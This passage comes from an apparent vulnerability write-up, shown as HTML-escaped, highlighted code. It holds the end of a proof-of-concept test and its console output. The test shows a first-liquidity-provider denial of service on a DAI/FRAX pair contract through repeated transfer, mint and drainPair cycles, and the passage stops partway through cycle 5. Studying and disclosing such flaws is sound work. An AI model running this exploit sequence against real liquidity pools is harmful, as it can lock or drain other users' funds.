class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINT_AMOUNT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINT_AMOUNT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereverted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// PoC expects revert, likely due to overflow or ILM with huge totalSupply\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk6\"\u003e\\n\u003c/span\u003e\u003cspan class=\"mtk8\"\u003eTest finished: Successfully demonstrated vulnerability and final mint reverted.\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVulnerability\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFirst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProvider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDOS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Address: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x0CECE5951F0aa1b0916435405acEC8dB1fD49Ef9\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003eToken0: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x5FbDB2315678afecb367f032d93F642f64180aa3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003eToken1: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e9999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e50000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e50000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e250000100000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e250000100000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1250000750000150000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1250000750000150000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan 